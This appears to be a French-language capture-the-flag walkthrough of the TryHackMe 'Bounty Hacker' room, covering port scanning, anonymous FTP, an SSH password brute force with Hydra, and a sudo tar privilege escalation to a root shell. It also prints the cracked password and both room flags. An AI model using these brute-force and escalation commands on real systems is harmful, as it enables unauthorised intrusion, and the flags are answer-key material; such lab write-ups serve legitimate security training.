# THM - Bounty Hacker
<p align="center">
  <img width="300" height="" src="./img/logo.jpeg">
</p>

Description | Difficulté | Lien
-------------|------------|-----
You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! | Easy 🟢| [THM](https://tryhackme.com/room/cowboyhacker)

Énumération de port :
```txt
nmap -A <ip>
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 12:29 EDT
Nmap scan report for <ip>
Host is up (0.029s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:<ip>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.29 seconds
```

Rien d'intéressant sur le port 80.
En allant sur le serveur FTP, on se rend compte qu'on peut se connecter en anonyme, mais que l'on ne peut pas lister le contenu du dossier à cause du mode "Passive"

En le désactivant, on arrive à voir la liste des fichiers accessible :
```log
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

Le fichier ``locks.txt`` est un dictionnaire de mot. Le fichier ``task.txt`` contient les éléments suivant :
```txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
On découvre l'utilisateur ``lin`` que nous allons tenter de brute force  avec le dictionnaire de mot ``locks.txt``

> **Note**
> Première question : Who wrote the task list? ``lin``

> **Note**
> Deuxième question : What service can you bruteforce with the text file found ? ``ssh``

On essaye donc avec Hydra:
```bash
hydra -l lin -P ~/THM/Bounty\ hacker/locks.txt <ip> ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-03 12:39:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://<ip>:22/
[22][ssh] host: 10.10.36.172   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-03 12:39:17
```
> **Note**
> Troisième question : What is the users password ? ``RedDr4gonSynd1cat3``

On se connecte avec le mot de passe trouvé et on affiche le premier flag user.

> **Note**
> Quatrième question : user.txt ``THM{CR1M3_SyNd1C4T3}``

En regardant les droits sudo de l'utilisateur ``lin,`` on voit qu'elle peut lancer ``/bin/tar`` en root. Grâce au site internet [Gtfobin](https://gtfobins.github.io/gtfobins/tar/) on voit qu'avec la commande suivante on pourra être root :
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

On est root et l’on récupère le flag.
> **Note** 
> Cinquième question : root.txt ``THM{80UN7Y_h4cK3r}``